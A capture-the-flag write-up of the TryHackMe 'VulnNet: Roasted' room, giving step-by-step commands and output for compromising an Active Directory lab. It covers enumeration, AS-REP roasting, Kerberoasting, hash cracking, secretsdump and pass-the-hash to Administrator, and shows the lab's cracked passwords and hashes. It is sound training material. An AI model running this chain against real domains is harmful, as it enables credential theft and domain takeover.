---
title: "TryHackMe - VulnNet: Roasted"
tags: ["windows", "active-directory", "smbmap", "smbclient", "impacket", "lookupsid.py", "asreproasting", "getnpusers.py", "hashcat", "kerberoasting", "getuserspns.py", "evil-winrm", "secretsdump.py"]
---

## Introduction

This is a **TryHackMe** room which can be found at: <a href="https://tryhackme.com/room/vulnnetroasted" target="_blank">VulnNet: Roasted</a>

VulnNet Entertainment quickly deployed another management instance on their very broad network...

## Reconnaissance & Scanning

Perform `nmap` scan to identify open ports and services treating the host as online.
- Command: `nmap -p- -T4 -Pn -v 10.10.232.200`


```shell
geobour98@kali:~$ nmap -p- -T4 -Pn -v 10.10.232.200
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-08 13:51 EET                                                                                  
Initiating Parallel DNS resolution of 1 host. at 13:51                                                                                           
Completed Parallel DNS resolution of 1 host. at 13:51, 0.00s elapsed                                                                             
Initiating Connect Scan at 13:51                                                                                                                 
Scanning 10.10.232.200 (10.10.232.200) [65535 ports]                                                                                             
Discovered open port 139/tcp on 10.10.232.200                                                                                                    
Discovered open port 135/tcp on 10.10.232.200                                                                                                    
Discovered open port 53/tcp on 10.10.232.200                                                                                                     
Discovered open port 445/tcp on 10.10.232.200                                                                                                    
Discovered open port 49668/tcp on 10.10.232.200                                                                                                  
Discovered open port 49699/tcp on 10.10.232.200                                                              
Discovered open port 49682/tcp on 10.10.232.200                                                                                      
Discovered open port 5985/tcp on 10.10.232.200                                                                                                   
Discovered open port 49670/tcp on 10.10.232.200                                                                                                  
Discovered open port 464/tcp on 10.10.232.200                                                                                                    
Discovered open port 389/tcp on 10.10.232.200                                                                                                    
Discovered open port 636/tcp on 10.10.232.200                                                                                                    
Discovered open port 88/tcp on 10.10.232.200                                                                                                     
Discovered open port 49665/tcp on 10.10.232.200                                                                                                  
Discovered open port 49669/tcp on 10.10.232.200                                                                                                  
Discovered open port 3269/tcp on 10.10.232.200                                                                                                   
Discovered open port 3268/tcp on 10.10.232.200                                                                                                   
Discovered open port 593/tcp on 10.10.232.200                                                                                                    
Discovered open port 9389/tcp on 10.10.232.200
Completed Connect Scan at 13:53, 167.54s elapsed (65535 total ports)
Nmap scan report for 10.10.232.200 (10.10.232.200)
Host is up (0.11s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49665/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49682/tcp open  unknown
49699/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 167.62 seconds
```

Perform aggressive `nmap` scan to enable OS detection, default scripts and version detection on the found ports treating the host as online. 
- Command: `sudo nmap -A -sC -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -v 10.10.232.200`


```shell
geobour98@kali:~$ sudo nmap -A -sC -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -v 10.10.232.200 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-08 14:01 EET                                                                                  
NSE: Loaded 155 scripts for scanning.                                                                                                            
NSE: Script Pre-scanning.                                                                                                                        
Initiating NSE at 14:01                                                                                                                          
Completed NSE at 14:01, 0.00s elapsed                                                                                                            
Initiating NSE at 14:01                                                                                                                          
Completed NSE at 14:01, 0.00s elapsed                                                                                                            
Initiating NSE at 14:01                                                                                                                          
Completed NSE at 14:01, 0.00s elapsed                                                                                                            
Initiating Parallel DNS resolution of 1 host. at 14:01                                                                                           
Completed Parallel DNS resolution of 1 host. at 14:01, 0.00s elapsed                                                                             
Initiating SYN Stealth Scan at 14:01                                                                                                             
Scanning 10.10.232.200 (10.10.232.200) [13 ports]                                                                                                
Discovered open port 445/tcp on 10.10.232.200                                                                                                    
Discovered open port 9389/tcp on 10.10.232.200                                                                                                   
Discovered open port 139/tcp on 10.10.232.200                                                                                                    
Discovered open port 53/tcp on 10.10.232.200                                                                                                     
Discovered open port 135/tcp on 10.10.232.200                                                                                                    
Discovered open port 3269/tcp on 10.10.232.200                                                                                                   
Discovered open port 636/tcp on 10.10.232.200                                                                                                    
Discovered open port 5985/tcp on 10.10.232.200                                                                                                   
Discovered open port 3268/tcp on 10.10.232.200                                                                                                   
Discovered open port 593/tcp on 10.10.232.200
Discovered open port 464/tcp on 10.10.232.200
Discovered open port 389/tcp on 10.10.232.200
Discovered open port 88/tcp on 10.10.232.200
Completed SYN Stealth Scan at 14:01, 0.23s elapsed (13 total ports)
Initiating Service scan at 14:01
Scanning 13 services on 10.10.232.200 (10.10.232.200)
Completed Service scan at 14:01, 13.56s elapsed (13 services on 1 host)
Initiating OS detection (try #1) against 10.10.232.200 (10.10.232.200)
Retrying OS detection (try #2) against 10.10.232.200 (10.10.232.200)
Initiating Traceroute at 14:01
Completed Traceroute at 14:01, 0.16s elapsed
Initiating Parallel DNS resolution of 1 host. at 14:01
Completed Parallel DNS resolution of 1 host. at 14:01, 0.00s elapsed
NSE: Script scanning 10.10.232.200.
Initiating NSE at 14:01
Completed NSE at 14:02, 40.05s elapsed
Initiating NSE at 14:02
Completed NSE at 14:02, 2.42s elapsed
Initiating NSE at 14:02
Completed NSE at 14:02, 0.00s elapsed
Nmap scan report for 10.10.232.200 (10.10.232.200)
Host is up (0.11s latency).

PORT     STATE SERVICE       VERSION 
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-08 12:01:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-11-08T12:01:35
|_  start_date: N/A
|_clock-skew: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   73.06 ms  10.8.0.1 (10.8.0.1)
2   149.15 ms 10.10.232.200 (10.10.232.200)

NSE: Script Post-scanning.
Initiating NSE at 14:02
Completed NSE at 14:02, 0.00s elapsed
Initiating NSE at 14:02
Completed NSE at 14:02, 0.00s elapsed
Initiating NSE at 14:02
Completed NSE at 14:02, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.40 seconds
           Raw packets sent: 97 (7.976KB) | Rcvd: 41 (2.404KB)
```

We notice that the Domain is: `vulnnet-rst.local`.

We can add this domain and its IP in the `/etc/hosts` file.

We can also try to enumerate the `shares` and their permissions using `smbmap`.
- Command: `smbmap -H 10.10.232.200 -u anonymous`


```shell
geobour98@kali:~$ smbmap -H 10.10.232.200 -u anonymous
[+] Guest session       IP: 10.10.232.200:445    Name: 10.10.232.200                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
```

After some enumeration on the shares with `READ ONLY` permissions, we didn't find anything interesting.


## Exploitation


Then, we can use the script `lookupsid.py` from `impacket` in order to perform bruteforcing of Windows SID's to identify users/groups on the remote target.
- Command: `/opt/impacket/examples/lookupsid.py anonymous@10.10.232.200`


```shell
geobour98@kali:~$ /opt/impacket/examples/lookupsid.py anonymous@10.10.232.200
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation                                                                                         
                                                                                                                                                 
Password:                                                                                                                                        
[*] Brute forcing SIDs at 10.10.232.200                                                                                                           
[*] StringBinding ncacn_np:10.10.232.200[\pipe\lsarpc]                                                                                            
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213                                                                                      
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                                          
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser) 
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

We found some usernames, so we can create a wordlist with `usernames` in order to use it to `ASREPRoasting` attack.

The wordlist `usernames.txt` should look like this:

```text
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

Then, we execute the script `GetNPUsers.py` from `impacket` in order to perform the `ASREPRoasting` attack, which is used to harvest the non-preauth AS_REP responses for a given list of usernames. These responses will then be encrypted with the user's password, which can then be cracked offline.

- Command: `/opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.232.200 -usersfile usernames.txt -no-pass vulnnet-rst.local/`


```shell
geobour98@kali:~$ /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.232.200 -usersfile usernames.txt -no-pass vulnnet-rst.local/
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:91a27a1253abc7bca67160c568048fd1$1167e38fb3eb84adf9a6748af9139fb43085e118f98bd0997c7ab51d0f8aa163893f1fdc3581e61a8536bc7c87d8799d21e301f821111598369aa5d5adcb398b73e4e1a98b9acd984093080a1d37a16d486596ef4e5063e1a496d6099e6967e0b9ea0407418d65604aee49f2683adc2d786bdc4a348db3c3f0b8596dbfe0ac37a2ecd0af2d7323d152155b610b21bded3d313492a7967ebee48b8f47dba5e1f5e939a2b96b104f0b7dc8f5a2c6b3ed625ace4bbad0ecab95a38787cebdc0a2f1662d7abb7797d1ef78a82807f9159432ec7c976cf5378dd171a22d7d8a76a5aede03ffac4724219391394ea547f204c37ab3f2d89a84
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

We found the hash for the user `t-skid`, which we put in a file and crack it with `hashcat` on mode `18200`.
- Command: `hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`

```shell
geobour98@kali:~$ hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:33a9b2294ab57133e1f428724cafeaee$ad62d6b18dcbd50c7a501b186e65e9fe12fbde18015bd1c4748b2dab89db657461d940b1d1afe024e003ed6ef9d9e6f9d2d3566bfdeeeabece7fad7073239b11d4c8cca7641889e380e6e3d150f99595586090c906280737698476b60d7bc888f1d810adc3a5b69239e16e745c0cd091365736a42baf9e9428dd0fcfd83a6d038d82bcd5a3c87e42f6c277f1a8ed384c555052498a3b478cdad4fb22f2f7685a0b0fd837725ddadcb6640fa46b53502b24f2be59e1e120a872e0de0fd3544590bfb905eb435833339dc28c9adc06b6ec795dedb775db071b479a32aee442460ae2ad1631e7eed0097a539e59f07e6517562e7b7dabb1:tj072889*
```

So, the cleartext password for `t-skid` is `tj072889*`.

Now, we can perform the `Kerberoasting` attack, which attempts to fetch Service Principal Names that are associated with normal user accounts. A ticket that is encrypted with the user account’s password is returned, which can then be bruteforced offline.
- Command: `/opt/impacket/examples/GetUserSPNs.py vulnnet-rst.local/t-skid:'tj072889*' -dc-ip 10.10.232.200 -request`


```shell
geobour98@kali:~$ /opt/impacket/examples/GetUserSPNs.py vulnnet-rst.local/t-skid:'tj072889*' -dc-ip 10.10.232.200 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 21:45:09.913979  2021-03-14 01:41:17.987528             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$5bc05b5e08a81cb226c6b23272df4e95$7f705c093630a21b08128de6dae88225bba2cae7589aefbf31098f167ed23d1f91dcaa2a6386c770b706278366fb6e02cf533172ea5777f90d1efaaac48f9045fc1fa792e2ca57eaf2d12c6fa86e30c7c2421fc7c98cf5ccc1a131563dd3af338467861ec715476354d49c310588a38b29df8217a99eba6168728b489807e72785850279bd1a51a15caca272cac5285396d0fd13c05f6c889408cacf2171b45af9c438f048c7ac35b89295f447e908d2df8e5f90761cdbb9ddf87c7ffb816ccae03fbc36fb0d6a80569047a4c6cc51a0d1cb7187d7e1288216bfcc94a25a7ac026ae6508207784da01e7c7660f339fe8bb7a88d68be95f5c0331d05cf34c56288c21df9d5e0f6d7b2aa566ba3891855ccaff60e26eda257b251421978119494e6597c493ea4b769f276d156ed729c768f71849c4cb03fb75ca861a0cb7bd226de2c3503a43aaecff8245d3566cc61784d285b3d9e7c051b63ef366ef810fda31e3ead5cd3de68c14ed0447db4b43c2eae2cfa8444335a1a12e8033d0fa4334b52278d1d4189950bb6b23afddec426e8da50d921ff7af781027577a82c36492f1da51375d906e1a7ee820888e516f407ed105eebd1741fba436b2cbc84bf6544c825d6ca6aca61e4bf2ad9828c3607aec0072efbeb674bd4ea39434ec7cc670f1932005703284fddd2a79173ffb44f29fb6cd829a329ccf3e8bdb6ea81a72606b74eee58519dc038ce9403321be7638f6bc2ddd1a6a317bea60bd3dbf897c8250d39c50056be9e1b0c3600f32252bed046c67ba849c55f0642c9b6565597003e77bfa97d3923232061d097e02c64286967b0356e6993800a46b237b14fbd60eb98415ed366cd79ba39c39eee92c6507a173bf4887314f818be716530d7f9ce15f97ed6c9fb01e20b75253abae72cdb316730f56c88652ac2657b764438f8caf7dadb94c78e3cbf4bcfd775436f14b6738b3e631af6e73e89eb0ae7aeee04c0b290c275b21f9cc4fb193fa90374d8bf214ea231b2d6db4c2a2281e1e5ef33070139172576c02542b3a4e58e503b995ea44f0a123da1c4d122ae2381974a0881568d9793e978587b1959925044e1e4d970bedcfe09f71e9837aca764214549ca77d8467113ab367001e4fed7402c5aa989cd9ca9bf4c27219b52c4b2d3a85c7f5d9ca6fa914c847ba7646eef11cd9fd0ee612e5815130f054e76f163d3d0e064e6285759df9e45df44534c05a8e3f8fe2c0925aaf9a689975288b6f6138d5f6b8dc9404767f7a0aa24afce821a0f146acf9b1856e15f0a000b727a47c35073d215e53e781f56d4f6218e43595b6bc70c4f58d4c92a2de03e81faf1fc6954e1dc8b3581dd2f1e5c5b4a091965736c554a3eb692561c24ee1fdcfbcd26a9d1b
```

We found the hash for the user `enterprise-core-vn`, which we can put in a file and crack it with `hashcat` on mode `13100`.
- Command: `hashcat -m 13100 -a 0 hash1.txt /usr/share/wordlists/rockyou.txt`


```shell
geobour98@kali:~$ hashcat -m 13100 -a 0 hash1.txt /usr/share/wordlists/rockyou.txt
<snip>
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$5bc05b5e08a81cb226c6b23272df4e95$7f705c093630a21b08128de6dae88225bba2cae7589aefbf31098f167ed23d1f91dcaa2a6386c770b706278366fb6e02cf533172ea5777f90d1efaaac48f9045fc1fa792e2ca57eaf2d12c6fa86e30c7c2421fc7c98cf5ccc1a131563dd3af338467861ec715476354d49c310588a38b29df8217a99eba6168728b489807e72785850279bd1a51a15caca272cac5285396d0fd13c05f6c889408cacf2171b45af9c438f048c7ac35b89295f447e908d2df8e5f90761cdbb9ddf87c7ffb816ccae03fbc36fb0d6a80569047a4c6cc51a0d1cb7187d7e1288216bfcc94a25a7ac026ae6508207784da01e7c7660f339fe8bb7a88d68be95f5c0331d05cf34c56288c21df9d5e0f6d7b2aa566ba3891855ccaff60e26eda257b251421978119494e6597c493ea4b769f276d156ed729c768f71849c4cb03fb75ca861a0cb7bd226de2c3503a43aaecff8245d3566cc61784d285b3d9e7c051b63ef366ef810fda31e3ead5cd3de68c14ed0447db4b43c2eae2cfa8444335a1a12e8033d0fa4334b52278d1d4189950bb6b23afddec426e8da50d921ff7af781027577a82c36492f1da51375d906e1a7ee820888e516f407ed105eebd1741fba436b2cbc84bf6544c825d6ca6aca61e4bf2ad9828c3607aec0072efbeb674bd4ea39434ec7cc670f1932005703284fddd2a79173ffb44f29fb6cd829a329ccf3e8bdb6ea81a72606b74eee58519dc038ce9403321be7638f6bc2ddd1a6a317bea60bd3dbf897c8250d39c50056be9e1b0c3600f32252bed046c67ba849c55f0642c9b6565597003e77bfa97d3923232061d097e02c64286967b0356e6993800a46b237b14fbd60eb98415ed366cd79ba39c39eee92c6507a173bf4887314f818be716530d7f9ce15f97ed6c9fb01e20b75253abae72cdb316730f56c88652ac2657b764438f8caf7dadb94c78e3cbf4bcfd775436f14b6738b3e631af6e73e89eb0ae7aeee04c0b290c275b21f9cc4fb193fa90374d8bf214ea231b2d6db4c2a2281e1e5ef33070139172576c02542b3a4e58e503b995ea44f0a123da1c4d122ae2381974a0881568d9793e978587b1959925044e1e4d970bedcfe09f71e9837aca764214549ca77d8467113ab367001e4fed7402c5aa989cd9ca9bf4c27219b52c4b2d3a85c7f5d9ca6fa914c847ba7646eef11cd9fd0ee612e5815130f054e76f163d3d0e064e6285759df9e45df44534c05a8e3f8fe2c0925aaf9a689975288b6f6138d5f6b8dc9404767f7a0aa24afce821a0f146acf9b1856e15f0a000b727a47c35073d215e53e781f56d4f6218e43595b6bc70c4f58d4c92a2de03e81faf1fc6954e1dc8b3581dd2f1e5c5b4a091965736c554a3eb692561c24ee1fdcfbcd26a9d1b:ry=ibfkfv,s6h,
<snip>
```

So, the cleartext password for `enterprise-core-vn` is `ry=ibfkfv,s6h,`.

We can login as `enterprise-core-vn` using `evil-winrm` and read the user flag.
- Command: `evil-winrm -i 10.10.232.200 -u enterprise-core-vn`


```shell
geobour98@kali:~$ evil-winrm -i 10.10.232.200 -u enterprise-core-vn
Enter Password: 

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> type user.txt
[REDACTED]
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop>
```

## Privilege Escalation


Now we can access the `NETLOGON` share as the user `enterprise-core-vn` and see an interesting file `ResetPassword.vbs`, which we can download.
- Command: `smbclient \\\\10.10.232.200\\NETLOGON -U enterprise-core-vn`


```shell
geobour98@kali:~$ smbclient \\\\10.10.232.200\\NETLOGON -U enterprise-core-vn
Password for [WORKGROUP\enterprise-core-vn]:
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> mget *
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (2.3 KiloBytes/sec) (average 2.3 KiloBytes/sec)
smb: \> exit

geobour98@kali:~$ cat ResetPassword.vbs
<snip>
strUserNTName = "a-whitehat"                                                                                                                     
strPassword = "bNdKVkjv3RR9ht"
<snip>
```

So, we found the cleartext password `bNdKVkjv3RR9ht` of user `a-whitehat` inside the file `ResetPassword.vbs`.

Now we can use the script `secretsdump.py` from `impacket` in order to to dump secrets from the remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit.
- Command: `/opt/impacket/examples/secretsdump.py vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@10.10.232.200`


```shell
geobour98@kali:~$ /opt/impacket/examples/secretsdump.py vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@10.10.232.200
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

<snip>
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<snip>
```

Now, we can login with the `nthash` of the `Administrator` user using `evil-winrm`.
- Command: `evil-winrm -i 10.10.232.200 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d`


```shell
geobour98@kali:~$ evil-winrm -i 10.10.232.200 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
vil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt
[REDACTED]
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
vulnnet-rst\administrator
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

Now are the `Administrator` user and can read the system flag.

Proof of Concept (PoC image):
![Desktop View](/assets/img/vulnnetroasted/poc.png){: width="972" height="589" }
